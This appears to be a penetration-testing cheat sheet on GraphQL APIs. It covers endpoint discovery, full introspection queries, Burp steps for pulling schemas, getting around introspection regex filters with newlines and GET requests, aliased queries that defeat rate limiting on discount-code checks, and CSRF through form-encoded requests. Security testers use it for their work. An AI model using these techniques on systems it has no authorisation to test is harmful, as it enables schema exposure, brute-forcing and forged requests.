# GraphQL API

GraphQL syntax: [https://portswigger.net/web-security/graphql/what-is-graphql](https://portswigger.net/web-security/graphql/what-is-graphql)

## <mark style="color:yellow;">Serving over HTTP</mark>

**HTTP GET**&#x20;

GraphQL query should be specified in the "query" query string.

```
http://myapi/graphql?query={me{name}}
```

**HTTP POST**

JSON-encoded body

```json
{
  "query": "...",
  "operationName": "...",
  "variables": { "myVariable": "someValue", ... }
}
```

## <mark style="color:yellow;">GraphQL endpoints</mark> <a href="#finding-graphql-endpoints" id="finding-graphql-endpoints"></a>

### <mark style="color:yellow;">Universal queries</mark> <a href="#universal-queries" id="universal-queries"></a>

Sending `query{__typename}` to a GraphQL endpoint will return `{"data": {"__typename": "query"}}` in the response.

Try with POST, GET or POST with `application/x-www-form-urlencoded`

## <mark style="color:yellow;">Common endpoint names</mark> <a href="#common-endpoint-names" id="common-endpoint-names"></a>

```
/graphql
/api
/api/graphql
/graphql/api
/graphql/graphql
/v1/graphql
/v1/api
/v1/api/graphql
/v1/graphql/api
/v1/graphql/graphql
```

More endpoint: [https://github.com/danielmiessler/SecLists/blob/fe2aa9e7b04b98d94432320d09b5987f39a17de8/Discovery/Web-Content/graphql.txt](https://github.com/danielmiessler/SecLists/blob/fe2aa9e7b04b98d94432320d09b5987f39a17de8/Discovery/Web-Content/graphql.txt)

{% hint style="info" %}
**Note**: Response could be "query not present" or similar. (meaning it's present)
{% endhint %}

## <mark style="color:yellow;">Discovering schema information</mark> <a href="#discovering-schema-information" id="discovering-schema-information"></a>

### <mark style="color:yellow;">Using introspection</mark> <a href="#using-introspection" id="using-introspection"></a>

To use introspection to discover schema information, query the `__schema` field. (could be disabled in production environments)

```json
{
    "query": "{__schema{queryType{name}}}"
}
```

**Manual**

<details>

<summary>Running a full introspection query</summary>

```json
    #Full introspection query

    query IntrospectionQuery {
        __schema {
            queryType {
                name
            }
            mutationType {
                name
            }
            subscriptionType {
                name
            }
            types {
             ...FullType
            }
            directives {
                name
                description
                args {
                    ...InputValue
            }
            onOperation  #Often needs to be deleted to run query
            onFragment   #Often needs to be deleted to run query
            onField      #Often needs to be deleted to run query
            }
        }
    }

    fragment FullType on __Type {
        kind
        name
        description
        fields(includeDeprecated: true) {
            name
            description
            args {
                ...InputValue
            }
            type {
                ...TypeRef
            }
            isDeprecated
            deprecationReason
        }
        inputFields {
            ...InputValue
        }
        interfaces {
            ...TypeRef
        }
        enumValues(includeDeprecated: true) {
            name
            description
            isDeprecated
            deprecationReason
        }
        possibleTypes {
            ...TypeRef
        }
    }

    fragment InputValue on __InputValue {
        name
        description
        type {
            ...TypeRef
        }
        defaultValue
    }

    fragment TypeRef on __Type {
        kind
        name
        ofType {
            kind
            name
            ofType {
                kind
                name
                ofType {
                    kind
                    name
                }
            }
        }
    }
```

If introspection is enabled but the query fails, try removing the onOperation, onFragment, and onField directives. Many endpoints don't accept these in introspection queries.

</details>

**Automatic**

<details>

<summary>Burp</summary>

1. Browse the target application for requests to a GraphQL endpoint
2. Right-click the GraphQL request, select "Send to Repeater"
3. In Repeater, right-click in the Request panel, choose "GraphQL > Set introspection query"&#x20;
4. Click Send. If introspection is enabled, the server will return the full API schema. If you are working with an older GraphQL server, it may fail. So right-click within the Request and select GraphQL > Set legacy introspection query and try again.
5. In the Response panel, right-click and select "GraphQL > Save GraphQL queries to site map." Burp saves discovered queries as nodes on the site map. You can review these queries, and send them to Intruder or Repeater for further investigation or attacks.

[https://portswigger.net/burp/documentation/desktop/testing-workflow/working-with-graphql#accessing-graphql-api-schemas-using-introspection](https://portswigger.net/burp/documentation/desktop/testing-workflow/working-with-graphql#accessing-graphql-api-schemas-using-introspection)

</details>

Now you can easily view relationships between schema entities using a GraphQL visualizer: [https://graphql-kit.com/graphql-voyager/](https://graphql-kit.com/graphql-voyager/)

### <mark style="color:yellow;">Suggestions</mark>

Suggestions are a feature of the Apollo GraphQL platform where the server suggests query amendments in error messages. [Clairvoyance](https://github.com/nikitastupin/clairvoyance) is a tool that uses suggestions to automatically recover all or part of a GraphQL schema, even when introspection is disabled.

## <mark style="color:yellow;">Bypassing GraphQL introspection defenses</mark> <a href="#bypassing-graphql-introspection-defenses" id="bypassing-graphql-introspection-defenses"></a>

* Developers might use a regex to exclude the `__schema` keyword. Try spaces, new lines, and commas, which GraphQL ignores but flawed regex does not.

```json
    #Introspection query with newline
    {
        "query": "query{__schema
        {queryType{name}}}"
    }
```

* Try a GET request

```
    # Introspection probe as GET request

    GET /graphql?query=query%7B__schema%0A%7BqueryType%7Bname%7D%7D%7D
```

* POST request with a content-type of `x-www-form-urlencoded`

## <mark style="color:yellow;">Bypassing rate limiting</mark> <a href="#bypassing-rate-limiting-using-aliases" id="bypassing-rate-limiting-using-aliases"></a>

Use aliases to return multiple instances of the same type of object in one request.

```json
    #Request with aliased queries

    query isValidDiscount($code: Int) {
        isvalidDiscount(code:$code){
            valid
        }
        isValidDiscount2:isValidDiscount(code:$code){
            valid
        }
        isValidDiscount3:isValidDiscount(code:$code){
            valid
        }
    }
```

## <mark style="color:yellow;">GraphQL CSRF</mark> <a href="#graphql-csrf" id="graphql-csrf"></a>

GraphQL can be exploited for CSRF attacks. POST requests with `application/json` content type are secure against forgery if the content type is validated.

GET requests and POST with `application/x-www-form-urlencoded` content type can be sent by browsers.

<details>

<summary>JS script to convert JSON to application/x-www-form-urlencoded</summary>

```javascript
function jsonToUrlEncoded(jsonData) {
    const params = new URLSearchParams();

    for (const [key, value] of Object.entries(jsonData)) {
        if (typeof value === 'object') {
            params.append(key, JSON.stringify(value));
        } else {
            params.append(key, value);
        }
    }

    return params.toString();
}

// To change
const jsonData = {"query":"test","operationName":"test","variables":{"a":1,"b":2}};

const urlEncodedData = jsonToUrlEncoded(jsonData);
console.log(urlEncodedData);

```

</details>
